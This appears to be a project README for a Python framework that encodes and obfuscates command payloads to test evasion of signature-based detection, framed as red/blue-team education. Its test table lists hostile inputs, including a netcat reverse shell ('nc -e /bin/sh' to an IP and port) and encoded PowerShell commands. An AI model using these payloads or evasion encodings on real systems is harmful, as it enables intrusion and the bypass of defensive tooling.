# Custom Payload Encoder & Obfuscation Framework 🛡️

A practical educational framework for studying how offensive payloads are
encoded and obfuscated to evade signature-based detection systems.

> ⚠️ **Ethical Use Only** — Authorized environments only. Unauthorized use is illegal.

---

## 📌 Project Overview

Security tools like Antivirus, EDR, IPS, and Firewalls rely on signature-based
detection. This framework demonstrates how payloads are transformed to bypass
simple detection — helping both Red Teams and Blue Teams understand evasion
techniques and improve defenses.

---

## 📁 Project Structure

| File | Module | Function |
|------|--------|----------|
| `main.py` | Automation | Runs all modules in sequence |
| `encoder.py` | Encoder | Base64 / XOR / ROT13 / Multi-Layer |
| `obfuscator.py` | Obfuscator | Hex / Reverse / Toggle / Insert |
| `evasion_tester.py` | Evasion Tester | 14-signature detection simulation |
| `report_generator.py` | Report Generator | Saves payload_report.txt |

---

## ⚙️ How It Works
```
START
  ↓
Enter Payload
  ↓
Select Encryption Type (Encoding or Obfuscation)
  ↓
Apply Obfuscation Layer(s)
  ↓
Run Evasion Test  →  EVADED ✓ / CAUGHT ✗
  ↓
Generate Report
  ↓
END
```

---

## 🔧 Encoding Methods

| Method | Description | Evasion Level |
|--------|-------------|---------------|
| Base64 | Encodes to alphanumeric string | High |
| XOR | Scrambles using a numeric key | High |
| ROT13 | Shifts letters by 13 positions | Medium |
| Multi-Layer | Base64 + XOR + ROT13 combined | Very High |

## 🔧 Obfuscation Methods

| Method | Description | Evasion Level |
|--------|-------------|---------------|
| Hex Escape | Converts to \xNN hex codes | High |
| Reverse | Flips string backwards | Low |
| Case Toggle | Alternates UPPER/lower | Low |
| Random Insert | Inserts separator chars | Medium |

---

## 🛠️ Technologies Used

| Technology | Purpose |
|------------|---------|
| Python 3.x | Core programming language |
| `base64` | Base64 encoding/decoding |
| `itertools` / `random` | Character manipulation |

---

## 🚀 How to Run

**Step 1 — Place all 5 files in the same folder**

**Step 2 — Open terminal and run:**
```bash
python main.py
```

**Step 3 — Follow the prompts:**
```
Enter payload to test : powershell -enc whoami

Select encryption type:
  1. Encoding     (Base64 / XOR / ROT13)
  2. Obfuscation  (Hex / Reverse / Toggle / Insert)
Enter choice (1 or 2):
```

**Step 4 — View evasion result and check `payload_report.txt`**

---

## 📊 Sample Output
```
[Original Payload]
Payload  : powershell -enc whoami
DETECTED : ['powershell', 'whoami']
Status   : CAUGHT by 2 signature(s)

[Encoded Payload]
Payload  : cG93ZXJzaGVsbCAtZW5jIHdob2FtaQ==
Status   : EVADED detection!

Evasion rate : 100%
```

---

## 🎯 Test Payloads

| Payload | Expected |
|---------|----------|
| `powershell -enc whoami` | CAUGHT → encode to EVADE |
| `cmd.exe /c whoami` | CAUGHT → encode to EVADE |
| `nc -e /bin/sh 192.168.1.1 4444` | CAUGHT → try Multi-Layer |
| `eval(base64_decode(payload))` | CAUGHT → try ROT13 |
| `hello world` | Clean — not detected |

---

## ⚖️ Legal Disclaimer

This framework is designed exclusively for:
- Authorized penetration testing with written permission
- Educational cybersecurity lab environments
- Security auditing of systems you own

Unauthorized use is illegal under **CFAA**, **UK Computer Misuse Act**, and equivalent laws.

---

## 👤 Author

**Yug Kapuriya**
- LinkedIn: Yug Kapuriya
- Email: yugkapuriya404@gmail.com
